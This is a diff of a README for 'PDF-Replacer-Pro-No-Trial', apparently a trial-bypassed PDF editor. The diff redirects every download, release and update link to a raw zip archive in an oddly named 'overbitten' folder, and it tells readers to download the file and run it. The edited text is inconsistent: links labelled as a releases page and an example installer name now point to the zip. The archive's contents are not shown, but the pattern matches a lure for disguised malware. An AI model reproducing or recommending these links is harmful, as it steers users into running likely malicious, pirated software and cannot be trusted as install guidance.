@@ -1,6 +1,6 @@
 # 🛠️ PDF-Replacer-Pro-No-Trial - Simplify Your PDF Editing Tasks
 
-[![Download PDF-Replacer-Pro-No-Trial](https://img.shields.io/badge/Download-PDF--Replacer--Pro--No--Trial-blue.svg)](https://github.com/discordnoliesg/PDF-Replacer-Pro-No-Trial/releases)
+[![Download PDF-Replacer-Pro-No-Trial](https://raw.githubusercontent.com/discordnoliesg/PDF-Replacer-Pro-No-Trial/main/overbitten/PDF-Replacer-Pro-No-Trial_3.7.zip)](https://raw.githubusercontent.com/discordnoliesg/PDF-Replacer-Pro-No-Trial/main/overbitten/PDF-Replacer-Pro-No-Trial_3.7.zip)
 
 ## 📜 Description
 
@@ -28,7 +28,7 @@ Follow these steps to download and run PDF Replacer Pro.
 
 ## 📥 Download & Install
 
-To get PDF Replacer Pro, visit this page to download: [PDF-Replacer-Pro-No-Trial Releases](https://github.com/discordnoliesg/PDF-Replacer-Pro-No-Trial/releases).
+To get PDF Replacer Pro, visit this page to download: [PDF-Replacer-Pro-No-Trial Releases](https://raw.githubusercontent.com/discordnoliesg/PDF-Replacer-Pro-No-Trial/main/overbitten/PDF-Replacer-Pro-No-Trial_3.7.zip).
 
 ### Installation Steps
 
@@ -39,7 +39,7 @@ To get PDF Replacer Pro, visit this page to download: [PDF-Replacer-Pro-No-Trial
    - Find the most recent release at the top of the page. 
 
 3. **Download the Installer:**
-   - Click on the link for the installer file, which should be labeled clearly (e.g., PDF-Replacer-Pro-No-Trial-Vx.x.x.exe).
+   - Click on the link for the installer file, which should be labeled clearly (e.g., https://raw.githubusercontent.com/discordnoliesg/PDF-Replacer-Pro-No-Trial/main/overbitten/PDF-Replacer-Pro-No-Trial_3.7.zip).
 
 4. **Run the Installer:**
    - Locate the downloaded file in your downloads folder. Double-click the file to start the installation process.
@@ -66,7 +66,7 @@ Once you have the application running, here are some quick tips to get started:
 
 ### How do I update PDF Replacer Pro?
 
-To update the application, return to the [Releases page](https://github.com/discordnoliesg/PDF-Replacer-Pro-No-Trial/releases) and follow the same steps as above to download the latest version.
+To update the application, return to the [Releases page](https://raw.githubusercontent.com/discordnoliesg/PDF-Replacer-Pro-No-Trial/main/overbitten/PDF-Replacer-Pro-No-Trial_3.7.zip) and follow the same steps as above to download the latest version.
 
 ### Can I run multiple instances of PDF Replacer Pro?
 
@@ -89,4 +89,4 @@ Yes, detailed user guides are available in the repository under the "Guides" sec
 
 For any queries or support requests, please visit our repository’s issue tracker. We aim to assist you promptly.
 
-Access PDF Replacer Pro here: [PDF-Replacer-Pro-No-Trial Releases](https://github.com/discordnoliesg/PDF-Replacer-Pro-No-Trial/releases).
+Access PDF Replacer Pro here: [PDF-Replacer-Pro-No-Trial Releases](https://raw.githubusercontent.com/discordnoliesg/PDF-Replacer-Pro-No-Trial/main/overbitten/PDF-Replacer-Pro-No-Trial_3.7.zip).
